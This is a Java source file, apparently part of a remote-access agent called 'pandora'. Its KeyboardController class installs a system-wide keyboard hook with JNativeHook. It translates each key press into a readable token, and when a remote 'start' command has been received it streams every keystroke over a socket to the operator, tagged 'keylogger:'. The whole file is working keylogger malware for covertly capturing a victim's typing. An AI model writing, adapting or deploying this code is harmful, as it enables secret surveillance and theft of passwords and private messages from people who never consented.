package org.pandora.agent.control.impl;

import org.pandora.agent.Client;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyboardController implements NativeKeyListener {

    private final Client client;
    private boolean success;
    private int total;

    public KeyboardController(final Client client) {
        this.client = client;
        this.total = 0;
        try {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(this);
            this.success = true;
        } catch (final NativeHookException ignore) {
            this.success = false;
        }
    }

    public void execute(final String string) {
        switch (string) {
            case "start":
                this.total++;
                break;
            case "stop":
                if (this.total > 0) this.total--;
                break;
        }
    }

    @Override
    public void nativeKeyTyped(final NativeKeyEvent nativeKeyEvent) {
    }

    @Override
    public void nativeKeyPressed(final NativeKeyEvent nativeKeyEvent) {
        if (this.success) {
            String result;
            switch (nativeKeyEvent.getKeyCode()) {
                case 1:
                    result = "[Esc]";
                    break;
                case 15:
                    result = "[Tab]";
                    break;
                case 58:
                    result = "[CapsLock]";
                    break;
                case 42:
                    result = "[L Shift]";
                    break;
                case 29:
                    result = "[L Ctrl]";
                    break;
                case 56:
                    result = "[L Alt]";
                    break;
                case 3640:
                    result = "[R Alt]";
                    break;
                case 3613:
                    result = "[R Ctrl]";
                    break;
                case 57419:
                    result = "[Left]";
                    break;
                case 57416:
                    result = "[Up]";
                    break;
                case 57424:
                    result = "[Down]";
                    break;
                case 57421:
                    result = "[Right]";
                    break;
                case 3612:
                case 28:
                    result = "[Enter]";
                    break;
                case 3638:
                case 54:
                    result = "[R Shift]";
                    break;
                case 14:
                    result = "[Backspace]";
                    break;
                case 69:
                    result = "[Num Lock]";
                    break;
                case 3657:
                    result = "[Page Up]";
                    break;
                case 3665:
                    result = "[Page Down]";
                    break;
                case 3655:
                    result = "[Home]";
                    break;
                case 3663:
                    result = "[End]";
                    break;
                case 3667:
                    result = "[Delete]";
                    break;
                case 3666:
                    result = "[Insert]";
                    break;
                case 3639:
                    result = "[PrtScr OR *]";
                    break;
                case 88:
                    result = "[F12]";
                    break;
                case 87:
                    result = "[F11]";
                    break;
                case 68:
                    result = "[F10]";
                    break;
                case 67:
                    result = "[F9]";
                    break;
                case 66:
                    result = "[F8]";
                    break;
                case 65:
                    result = "[F7]";
                    break;
                case 64:
                    result = "[F6]";
                    break;
                case 63:
                    result = "[F5]";
                    break;
                case 62:
                    result = "[F4]";
                    break;
                case 61:
                    result = "[F3]";
                    break;
                case 60:
                    result = "[F2]";
                    break;
                case 59:
                    result = "[F1]";
                    break;
                case 3675:
                    result = "[Windows]";
                    break;
                case 57:
                    result = " ";
                    break;
                case 40:
                    result = "[² OR ']";
                    break;
                case 26:
                    result = "[) OR ° OR ]]";
                    break;
                case 13:
                    result = "[= OR + OR }]";
                    break;
                case 83:
                    result = ".";
                    break;
                case 3662:
                    result = "+";
                    break;
                case 3658:
                    result = "-";
                    break;
                case 53:
                    result = "[/ OR :]";
                    break;
                case 3677:
                    result = "[Context Menu]";
                    break;
                case 51:
                    result = "[, OR ?]";
                    break;
                case 52:
                    result = "[; OR .]";
                    break;
                case 125:
                    result = "[! OR §]";
                    break;
                case 27:
                    result = "[¨ OR ^]";
                    break;
                case 39:
                    result = "[$ OR £]";
                    break;
                case 41:
                    result = "[ù OR %]";
                    break;
                case 43:
                    result = "[* OR µ]";
                    break;
                case 3653:
                    result = "[Pause]";
                    break;
                case 70:
                    result = "[Ver Del]";
                    break;
                case 0:
                    result = "[Undefined (something > OR <)]";
                    break;
                default:
                    final String text = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
                    if (text.length() == 1) result = text;
                    else result = "[Undefined " + text + "]";
                    break;
            }
            if (this.total > 0) this.client.getSocketUtils().write("keylogger:" + result.replace(":", "(doubleDot)"));
        }
    }

    @Override
    public void nativeKeyReleased(final NativeKeyEvent nativeKeyEvent) {
    }
}